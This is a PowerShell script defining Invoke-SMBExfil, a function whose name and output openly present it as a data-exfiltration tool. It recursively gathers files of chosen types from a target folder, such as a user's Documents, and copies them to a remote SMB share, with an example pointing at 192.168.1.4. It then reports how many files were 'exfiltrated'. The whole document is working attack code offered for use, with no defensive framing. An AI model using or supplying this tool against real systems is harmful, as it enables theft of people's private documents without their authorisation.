function Invoke-SMBExfil
{
<#
.Synopsis
   Copies files and all subdirectories from source to location folder.
.DESCRIPTION
   Name: Invoke-SMBExfil
   Author: PoshMagiC0de

   Copies files from the folder specified and all subfolders plus file types if added to the destination folder, keeping folder schema.
.EXAMPLE
   Invoke-SMBExfil -targetfolder "$env:userprofile\Documents" -destUNC "\\192.168.1.4\foldershare\targetfolder" -filenames @("*.gif","*.jpg","*.docx","*.xlsx")

#>

    [CmdletBinding()]
    Param(

        [Parameter(Mandatory=$true, Position=0)]
        [ValidateScript({Test-Path -Path (Resolve-Path $_) -PathType "Container"})]
        [string]$targetfolder,

        [Parameter(Mandatory=$true, Position=1)]
        [ValidateScript({Test-Path -Path $_})]
        [string]$destUNC,        

        [Parameter(Mandatory=$false, Position=2)]
        [string[]]$filenames = @("*")
    )

    $roottarget = (Resolve-Path $targetfolder).ToString() + "\"
    $rootdest = $destUNC + "\smbexfil\"    
    $targetfiles = gci -Path ($roottarget + "*") -Include $filenames -Recurse -ErrorAction SilentlyContinue | Where {$_.PSIsContainer -eq $false} |
        foreach {new-object psobject -Property @{
            source = $_.FullName
            destination = ($_.FullName -replace ($roottarget -replace "\\", "\\"), "$rootdest")
            extension = $_.Extension
        }}

    $targetfiles | foreach {
        if(-not (Test-Path (Split-Path $_.destination -Parent)))
        {
            $null = New-Item -Path (Split-Path $_.destination -Parent) -ItemType Directory
        }
        Copy-Item -Path ($_.source) -Destination ($_.destination) -Force -ErrorAction SilentlyContinue}

    $returnstring = "A total of {0} files were exfiltrated.`r`n" -f ($targetfiles.Count)
    $returnstring += "From those, the following filetypes or files from you list were pulled.`r`n`r`n"

    foreach($fileExt in $filenames)
    {
        $returnstring += "Type {0}: {1} files.`r`n" -f ($fileExt, ($targetfiles | where {$_.Extension -like $fileExt}).Count)
    }
    $targetfiles
    return $returnstring | Out-String
}
